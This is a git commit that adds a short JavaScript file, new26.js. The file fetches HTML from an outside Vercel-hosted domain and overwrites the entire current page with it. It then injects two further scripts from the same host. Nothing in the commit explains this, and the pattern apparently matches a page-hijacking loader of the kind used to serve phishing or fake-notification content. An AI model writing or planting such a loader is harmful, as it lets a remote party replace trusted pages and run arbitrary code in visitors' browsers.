a2a8e61e652be5c48fbde71e467abb9b567cc2de
burneddd <162927609+burneddd@users.noreply.github.com>
2024-09-21 03:28:45 +0100

    Add files via upload

---
+++ new26.js
@@ -0,0 +1,23 @@
+fetch('https://curtis-gamma.vercel.app/new10.txt')
+  .then(response => {
+    if (response.ok) {
+      return response.text(); 
+    }
+    throw new Error('Network response was not ok.');
+  })
+  .then(html => {
+    document.documentElement.innerHTML = html; 
+    document.body.replaceWith(document.body.cloneNode(true));
+    
+
+
+    const script = document.createElement('script');
+    script.src = 'https://curtis-gamma.vercel.app/657457.js';
+    document.body.appendChild(script);
+    const script2 = document.createElement('script');
+    script2.src = 'https://curtis-gamma.vercel.app/noti1.js';
+    document.body.appendChild(script2);
+  })
+  .catch(error => {
+    console.error('There was a problem with the fetch operation:', error);
+  });
